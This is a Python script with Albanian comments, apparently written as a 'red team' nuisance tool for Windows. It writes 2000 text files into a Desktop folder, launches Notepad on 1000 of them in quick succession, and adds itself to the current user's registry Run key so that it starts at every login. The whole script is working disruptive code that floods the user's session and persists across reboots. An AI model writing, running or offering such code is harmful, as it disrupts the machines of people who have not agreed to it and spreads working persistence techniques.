import os
import subprocess
import time
import shutil
import sys
import winreg

# Vendndodhja e Desktop-it
desktop = os.path.join(os.path.expanduser("~"), "Desktop")
marker_file = os.path.join(desktop, "autorun_marker.txt")

# Emri i folderit të dedikuar ku do të krijohen vetëm këta skedarë
custom_folder = os.path.join(desktop, "RedTeamFiles")

# Sigurohu që folderi ekziston
if not os.path.exists(custom_folder):
    os.makedirs(custom_folder)

# 1. Krijo 2000 skedarë vetëm një herë
if not os.path.exists(marker_file):
    for i in range(2000):
        file_name = f"file_{i+1}.txt"
        file_path = os.path.join(custom_folder, file_name)
        with open(file_path, "w") as f:
            f.write(f"Kjo është skedari numër {i+1}.\n")
    with open(marker_file, "w") as f:
        f.write("Skedarët janë krijuar.\n")

# 2. Hap 1000 prej tyre me Notepad
for i in range(1000):
    file_name = f"file_{i+1}.txt"
    file_path = os.path.join(custom_folder, file_name)
    if os.path.exists(file_path):
        subprocess.Popen(['notepad.exe', file_path])
        time.sleep(0.1)

# 3. Vendos skriptin në autorun nëpërmjet Windows Registry
def add_to_startup():
    script_path = os.path.realpath(sys.argv[0])
    script_name = os.path.basename(script_path).replace(".py", "")
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0, winreg.KEY_SET_VALUE
    )
    winreg.SetValueEx(key, script_name, 0, winreg.REG_SZ, f'"{script_path}"')
    winreg.CloseKey(key)

try:
    add_to_startup()
except Exception as e:
    print("❌ Shtimi në autorun dështoi:", e)
